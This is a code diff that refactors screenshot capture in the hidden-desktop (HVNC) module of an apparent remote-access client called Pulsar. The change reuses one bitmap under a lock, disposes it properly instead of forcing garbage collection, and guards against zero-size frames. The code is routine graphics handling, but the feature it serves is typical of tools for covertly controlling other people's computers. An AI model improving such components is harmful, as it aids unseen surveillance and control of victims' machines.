@@ -64,6 +64,8 @@ namespace Pulsar.Client.Helper.HVNC
         private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
 
         private readonly float _scalingFactor;
+        private Bitmap _reusableScreenshotBitmap;
+        private object _bitmapLock = new object(); // For thread-safe access to _reusableScreenshotBitmap
 
         public ImageHandler(string DesktopName)
         {
@@ -74,6 +76,8 @@ namespace Pulsar.Client.Helper.HVNC
             }
             this.Desktop = intPtr;
             this._scalingFactor = CalculateScalingFactor();
+            // Initialize _reusableScreenshotBitmap, potentially based on primary screen dimensions as a default
+            // For now, it will be initialized on first use or if dimensions change in Screenshot()
         }
 
         private static float CalculateScalingFactor()
@@ -155,22 +159,58 @@ namespace Pulsar.Client.Helper.HVNC
         public void Dispose()
         {
             CloseDesktop(this.Desktop);
-            GC.Collect();
+            lock (_bitmapLock)
+            {
+                _reusableScreenshotBitmap?.Dispose();
+                _reusableScreenshotBitmap = null;
+            }
+            // GC.Collect(); // Removed
         }
 
         public Bitmap Screenshot()
         {
             SetThreadDesktop(this.Desktop);
-            IntPtr dc = GetDC(IntPtr.Zero);
+            IntPtr dc = GetDC(IntPtr.Zero); // DC for the current thread's desktop
             RECT rect;
-            GetWindowRect(GetDesktopWindow(), out rect);
-            float scalingFactor = _scalingFactor; // Use cached value
-            Bitmap bitmap = new Bitmap((int)((float)rect.Right * scalingFactor), (int)((float)rect.Bottom * scalingFactor));
-            Graphics graphics = Graphics.FromImage(bitmap);
-            this.DrawTopDown(IntPtr.Zero, graphics, dc);
-            graphics.Dispose();
-            ReleaseDC(IntPtr.Zero, dc);
-            return bitmap;
+            GetWindowRect(GetDesktopWindow(), out rect); // Dimensions of the virtual desktop window
+
+            float scalingFactor = this._scalingFactor;
+            int targetWidth = (int)((float)rect.Right * scalingFactor);
+            int targetHeight = (int)((float)rect.Bottom * scalingFactor);
+
+            // Ensure target dimensions are valid
+            if (targetWidth <= 0 || targetHeight <= 0)
+            {
+                ReleaseDC(IntPtr.Zero, dc);
+                // Return a small dummy bitmap or throw an exception,
+                // as 0-size bitmaps are invalid.
+                // This case should ideally not happen if GetWindowRect provides valid dimensions.
+                return new Bitmap(1, 1); // Fallback, though an error might be more appropriate
+            }
+            
+            lock(_bitmapLock)
+            {
+                if (_reusableScreenshotBitmap == null || _reusableScreenshotBitmap.Width != targetWidth || _reusableScreenshotBitmap.Height != targetHeight)
+                {
+                    _reusableScreenshotBitmap?.Dispose();
+                    _reusableScreenshotBitmap = new Bitmap(targetWidth, targetHeight, PixelFormat.Format32bppArgb); // Using a common pixel format
+                }
+
+                using (Graphics graphics = Graphics.FromImage(_reusableScreenshotBitmap))
+                {
+                    // Clear the bitmap with transparency to avoid artifacts from previous frame
+                    graphics.Clear(Color.Transparent); 
+                    // It's important that DrawTopDown correctly populates the full area,
+                    // or use a fill if it only draws sparse windows.
+                    // Assuming DrawTopDown renders the entire desktop content.
+
+                    this.DrawTopDown(IntPtr.Zero, graphics, dc);
+                }
+                ReleaseDC(IntPtr.Zero, dc);
+                // The caller (HVNCHandler.CaptureFrame) expects to own the Bitmap and dispose it.
+                // So, we must return a clone.
+                return (Bitmap)_reusableScreenshotBitmap.Clone();
+            }
         }
 
         public IntPtr Desktop = IntPtr.Zero;
